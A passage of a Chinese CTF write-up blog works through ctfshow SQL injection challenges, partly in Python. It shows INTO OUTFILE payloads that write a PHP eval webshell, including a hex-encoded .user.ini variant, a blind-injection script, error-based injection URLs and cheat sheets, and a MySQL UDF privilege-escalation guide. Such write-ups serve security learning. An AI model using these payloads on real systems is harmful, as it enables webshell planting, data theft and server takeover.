1</span></span><br><span class="line"><span class="string">            print('[*] 开始盲注第&#123;&#125;位'.format(n))</span></span><br><span class="line"><span class="string">            print(flag)</span></span><br><span class="line"><span class="string">            if j == "</span>&#125;<span class="string">":</span></span><br><span class="line"><span class="string">                print('[*] flag is &#123;&#125;'.format(flag))</span></span><br><span class="line"><span class="string">                exit()</span></span><br><span class="line"><span class="string">            break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802070239988.png" alt="image-20210802070239988"></p>
<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><blockquote>
<ul>
<li>到了file模块了，首先我们先了解一下关于file的形式，做这题前，先了解一些预备知识</li>
</ul>
</blockquote>
<p><strong>我们到本地进行测试一下file的功能</strong></p>
<p>首先第一个我们了解一下字段分隔符</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED BY‘,‘字段间分割符</span><br><span class="line">OPTIONALLY ENCLOSED BY‘&quot;‘将字段包围 对数值型无效--未测试</span><br></pre></td></tr></table></figure></div>

<p>利用字段分隔符在本地写一句话木马</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802072512149.png" alt="image-20210802072512149"></p>
<p><strong>可以发现很好的写入成功</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802072534703.png" alt="image-20210802072534703"></p>
<p>我们再学习一个将每一条记录使用换行符</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LINES TERMINATED BY‘\n‘ 换行符</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users into outfile &quot;D:&#x2F;phpstudy8&#x2F;WWW&#x2F;dump&#x2F;1.txt&quot; LINES TERMINATED BY &#39;&lt;?php eval(REQUEST[1]);?&gt;&#39;</span><br></pre></td></tr></table></figure></div>

<p>明显将一句话木马写入</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802073050645.png" alt="image-20210802073050645"></p>
<p>我们看一下题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;备份表</span><br><span class="line">$sql &#x3D; &quot;select * from ctfshow_user into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;dump&#x2F;&#123;$filename&#125;&#39;;&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>这题明显就有两种做法，我们用分隔符做</strong></p>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;7.php&#39; FIELDS TERMINATED BY &#39;&lt;?php eval($_REQUEST[1]);?&gt; &#39; #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802073413150.png" alt="image-20210802073413150"></p>
<p>这题我眼瞎，找flag半天，没发现flag在根目录，结果以为在数据库里面，因为权限不够，我在dump目录下写了个数据库连接以及查询的语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">$ua &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line"></span><br><span class="line">$filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line"></span><br><span class="line">$num &#x3D; 1;</span><br><span class="line">$ret &#x3D; array(</span><br><span class="line">	&quot;code&quot;&#x3D;&gt;0,</span><br><span class="line">	&quot;msg&quot;&#x3D;&gt;&quot;导出失败&quot;,</span><br><span class="line">	&quot;count&quot;&#x3D;&gt;$num,</span><br><span class="line">	&quot;data&quot;&#x3D;&gt;array()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($filename))&#123;</span><br><span class="line"></span><br><span class="line">	$conn &#x3D; new mysqli($dbhost,$dbuser,$dbpwd,$dbname);</span><br><span class="line">	if(mysqli_connect_errno())&#123;</span><br><span class="line">	 	die(json_encode(array(mysqli_connect_error())));</span><br><span class="line">	&#125;</span><br><span class="line">	$conn-&gt;query(&quot;set name $charName&quot;);</span><br><span class="line"></span><br><span class="line">	$sql &#x3D; &quot;select * from ctfshow_user where username&#x3D;&#123;$filename&#125;;&quot;;</span><br><span class="line">	$conn-&gt;query(&quot;set name $charName&quot;);</span><br><span class="line">	$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    while ($row &#x3D; mysqli_fetch_array($result))&#123;  </span><br><span class="line">        echo &quot;u:&quot;.$row[&#39;username&#39;];</span><br><span class="line">        echo &quot;p:&quot;.$row[&#39;pass&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">	if(mysqli_affected_rows($conn))&#123;</span><br><span class="line">		$ret[&#39;msg&#39;]&#x3D;&quot;导出&#123;$filename&#125;成功&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$ret[&#39;msg&#39;]&#x3D;&quot;导出&#123;$filename&#125;失败&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($conn);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo json_encode($ret);</span><br></pre></td></tr></table></figure></div>

<p>然后利用自己写的一个盲注脚本跑了整个数据库，没找到脚本，最后才发现在根目录，脚本上来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;1</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line">#import time</span><br><span class="line"></span><br><span class="line"># def generateNum(num):</span><br><span class="line">#     res &#x3D; &#39;true&#39;</span><br><span class="line">#     if num &#x3D;&#x3D; 1:</span><br><span class="line">#         return res</span><br><span class="line">#     else:</span><br><span class="line">#         for i in range(num-1):</span><br><span class="line">#             res +&#x3D; &quot;+true&quot;</span><br><span class="line">#         return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9c4ff2fb-3479-4628-be92-f7dff3560001.challenge.ctf.show:8080&#x2F;dump&#x2F;dump.php&quot;</span><br><span class="line">str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">#password&#x3D;1234567811&amp;username&#x3D;ctfshow&#39; and if(substr(database(),1,1)&#x3D;&#39;c&#39;,1,0)#</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">#--------查表</span><br><span class="line">sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;</span><br><span class="line">#--------查字段</span><br><span class="line">#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag233333&#39;&quot;</span><br><span class="line">#--------查flag</span><br><span class="line">#sql&#x3D; &quot;select group_concat(flagass233) from flag233333&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;&#39;ctfshow&#39; and if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,1,0)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#计数</span><br><span class="line">n &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(1, 666):</span><br><span class="line">    for j in str:</span><br><span class="line">        params &#x3D; &#123;</span><br><span class="line">            &#39;filename&#39; : payload.format(sql,i,j),</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; requests.post(url &#x3D; url, data &#x3D; params)</span><br><span class="line">        if &quot;u:ctfshowp&quot; in res.text:</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            n +&#x3D; 1</span><br><span class="line">            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j &#x3D;&#x3D; &quot;&#125;&quot;:</span><br><span class="line">                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p><strong>简简单单的找flag，我搞成了代码审计。这两个代码仅供娱乐。只能扒光数据库，但是找不到flag。注意：flag在根目录o(╥﹏╥)o</strong></p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><blockquote>
<ul>
<li>过滤了php，这时候我们想到了用户自定义<code>.user.ini</code>函数，刚刚好他这个dump目录下有一个Index.php文件，所以我们可以直接梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0A3C3F706870206576616C28245F524551554553545B315D293B3F3E0A &#x3D;&#x3D;&gt; \nauto_prepend_file&#x3D;gylq.jpg</span><br></pre></td></tr></table></figure></div>

<p>首先上传一个图片文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;gylq.jpg&#39; LINES TERMINATED BY 0x0A3C3F706870206576616C28245F524551554553545B315D293B3F3E0A#</span><br></pre></td></tr></table></figure></div>

<p>在上传<code>.user.ini</code>文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;.user.ini&#39; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#</span><br></pre></td></tr></table></figure></div>

<p><strong>接着访问index.php</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802100525229.png" alt="image-20210802100525229"></p>
<p><strong>getshell拿flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802100538845.png" alt="image-20210802100538845"></p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><blockquote>
<ul>
<li>终于来到报错模块了</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;备份表</span><br><span class="line"> $sql &#x3D; &quot;select id,username,pass from ctfshow_user where id &#x3D; &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>经典报错注入</strong>拿表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8b891a41-b3c2-4892-96e2-88623f86dd70.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' or updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)%23</span></span><br></pre></td></tr></table></figure></div>

<p>拿字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8b891a41-b3c2-4892-96e2-88623f86dd70.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' or updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_flag<span class="string">')),1)%23</span></span><br></pre></td></tr></table></figure></div>

<p>拿flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">左半边flag</span><br><span class="line">ctfshow&#123;5079b895-164f-4ea3-9e0e</span><br><span class="line">右半边flag</span><br><span class="line">5-164f-4ea3-9e0e-553ff35fee35&#125;</span><br><span class="line">删除重合的部分</span><br><span class="line">ctfshow&#123;5079b895-164f-4ea3-9e0e-553ff35fee35&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><blockquote>
<ul>
<li><strong>过滤了update</strong>，可以积累一下报错注入的语句</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. floor + rand + group by</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  !<span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  <span class="keyword">limit</span> <span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line">2. ExtractValue</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">3. UpdateXml</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">4. Name_Const(&gt;5.0.12)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">0</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line">5. Join</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br></pre></td></tr></table></figure></div>

<p><strong>拿表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))%23</span><br></pre></td></tr></table></figure></div>

<p><strong>拿字段</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagsa&#39;)))#</span><br></pre></td></tr></table></figure></div>

<p><strong>拿flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">前部分</span><br><span class="line">ctfshow&#123;b2cc23cb-316b-4cea-b9ea</span><br><span class="line">语句</span><br><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(flag1) from ctfshow_flagsa)))%23</span><br><span class="line">后部分</span><br><span class="line">a-b9ea-9807145c946a&#125;</span><br><span class="line">语句</span><br><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select right(group_concat(flag1),20) from ctfshow_flagsa)))%23</span><br><span class="line">重复部分删除</span><br><span class="line">ctfshow&#123;b2cc23cb-316b-4cea-b9ea-9807145c946a&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><blockquote>
<ul>
<li>过滤多加了个extractvalue，换一个方法，用group by报错方法，不过group by报错方法有and联合，还有union联合两种方法，都展示一下</li>
</ul>
</blockquote>
<p><strong>查字段</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select count(*) from information_schema.tables group by concat((select column_name from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_flags<span class="string">' limit 1,1),floor(rand(0)*2))) %23</span></span><br></pre></td></tr></table></figure></div>

<p><strong>flag，没有长度限制</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select flag2 from ctfshow_flags limit 0,1),floor(rand(0)*2))) %23</span><br></pre></td></tr></table></figure></div>

<p>union报错查询查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2)) a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><blockquote>
<ul>
<li>过滤了向下取整floor，没过滤ceil向上取整</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b89fec88-85a4-4e59-b9b2-d6c71204e161.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))) %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><blockquote>
<ul>
<li>考点udf注入</li>
</ul>
</blockquote>
<h3 id="一、什么是udf"><a href="#一、什么是udf" class="headerlink" title="一、什么是udf"></a>一、什么是udf</h3><p> udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p>
<p> udf 文件后缀一般为 dll，由C、C++编写</p>
<h3 id="二、udf在渗透中的作用"><a href="#二、udf在渗透中的作用" class="headerlink" title="二、udf在渗透中的作用"></a>二、udf在渗透中的作用</h3><p> 在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<h3 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h3><p>利用udf的条件其实还是挺苛刻的</p>
<p><strong>mysql用户权限问题</strong></p>
<ul>
<li><p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
</li>
<li><p>拥有将udf.dll写入相应目录的权限。</p>
</li>
</ul>
<h3 id="四、数据库版本问题"><a href="#四、数据库版本问题" class="headerlink" title="四、数据库版本问题"></a>四、数据库版本问题</h3><p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;= MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody></table>
<p><strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
<h3 id="五、本地利用过程"><a href="#五、本地利用过程" class="headerlink" title="五、本地利用过程"></a>五、本地利用过程</h3><p><strong>1、获取Mysql安装路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @basedir</span><br></pre></td></tr></table></figure></div>

<p><strong>2、查看可操作路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%secure%&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>3、查看plugin目录路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure></div>

<p><strong>4、将dll上传方式推荐几种</strong></p>
<p>将dll上传到安装路径的方式：</p>
<p>通过webshell上传</p>
<p>以hex方式直接上传</p>
<p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p>
<p><strong>5、sqlmap中udf获取方式</strong></p>
